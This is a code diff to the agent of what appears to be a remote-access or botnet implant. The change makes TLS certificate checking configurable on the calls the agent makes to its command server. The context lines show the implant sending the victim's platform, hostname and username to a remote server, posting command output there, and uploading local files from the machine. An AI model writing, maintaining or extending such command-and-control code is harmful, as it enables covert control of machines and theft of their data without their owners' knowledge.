@@ -90,7 +90,8 @@ class Agent(object):
     def server_hello(self):
         """ Ask server for instructions """
         req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
-            json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
+                verify=config.TLS_VERIFY,
+                json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
         return req.text
 
     def send_output(self, output, newlines=True):
@@ -102,8 +103,9 @@ class Agent(object):
             return
         if newlines:
             output += "\n\n"
-        req = requests.post(config.SERVER + '/api/' + self.uid + '/report', 
-        data={'output': output})
+        req = requests.post(config.SERVER + '/api/' + self.uid + '/report',
+                verify=config.TLS_VERIFY,
+                data={'output': output})
 
     def expand_path(self, path):
         """ Expand environment variables and metacharacters in a path """
@@ -159,6 +161,7 @@ class Agent(object):
             if os.path.exists(file) and os.path.isfile(file):
                 self.send_output("[*] Uploading %s..." % file)
                 requests.post(config.SERVER + '/api/' + self.uid + '/upload',
+                    verify=config.TLS_VERIFY,
                     files={'uploaded': open(file, 'rb')})
             else:
                 self.send_output('[!] No such file: ' + file)
